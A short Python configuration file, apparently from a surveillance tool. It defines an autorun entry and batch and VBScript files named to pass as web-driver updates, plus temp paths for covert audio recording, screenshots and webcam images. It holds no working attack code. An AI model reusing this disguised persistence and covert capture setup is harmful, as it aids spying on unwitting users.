import os
import tempfile

BASE_DIR = os.path.dirname(os.path.realpath(__file__))
PC_TEMP_DIR = tempfile.gettempdir()
PROJECT_TEMP_DIR = os.path.join(BASE_DIR, "temp")

PYTHON_VENV_PATH = os.path.join("venv", "Scripts", "python.exe")

MAIN_FILE_NAME = "main.py"
AUTORUN_NAME = "WebDrive"
BAT_FILENAME = "webDriver.bat"
RUN_FILENAME = "webDriverUpdates.vbs"

RECORD_PATH = os.path.join(PC_TEMP_DIR, "sound.wav")
SCREENSHOT_PATH = os.path.join(PC_TEMP_DIR, "screenshot")
WEBCAM_SCREEN_PATH = os.path.join(PC_TEMP_DIR, "webcam.jpg")
